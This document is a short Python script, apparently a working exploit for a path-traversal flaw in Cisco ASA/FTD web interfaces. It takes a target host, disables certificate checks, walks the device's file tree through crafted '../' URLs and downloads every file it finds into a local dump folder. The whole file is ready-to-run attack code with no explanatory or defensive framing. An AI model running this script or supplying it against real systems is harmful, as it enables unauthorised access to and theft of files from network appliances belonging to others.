import requests
import sys
import ast
import json
import os

from enum import Enum
from pathlib import Path
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class FileType(Enum):
    FILE = "0"
    FOLDER = "1"

s = requests.Session()
s.mount("https://", HTTPAdapter(max_retries=5))

out_dir = Path.cwd() / "dump"
file_list="https://{}/+CSCOU+/../+CSCOE+/files/file_list.json?path={}"
file_get="https://{}/+CSCOT+/translation-table?type=mst&textdomain={}&default-language&lang=../"

def get(url):
    r = requests.Request(method = "GET", url = url)
    prep = r.prepare()
    prep.url = url
    return s.send(prep, verify = False)

def process(target, dump_dir):
    print("Fetching:", dump_dir)
    os.makedirs(out_dir / ("." + dump_dir), exist_ok = True)

    res = get(file_list.format(target, dump_dir.replace("+", "%2b")))

    try:
        files = json.loads("[" + res.text[res.text.index("{"):].replace("'", '"') + "]")
    except ValueError:
        return

    for file in files:
        if file["type"] == FileType.FOLDER.value:
            process(target, str(Path(dump_dir) / os.path.basename(file["name"])))

        elif file["type"] == FileType.FILE.value:
            path = Path(dump_dir) / os.path.basename(file["name"])
            print("Fetching:", path)

            res = get(file_get.format(target, str(path).replace("+", "%2b")))

            with open(out_dir / ("." + str(path)), "wb") as f:
                f.write(res.content)

if __name__ == "__main__":
    target=sys.argv[1]
    out_dir /= target

    process(target, "/")
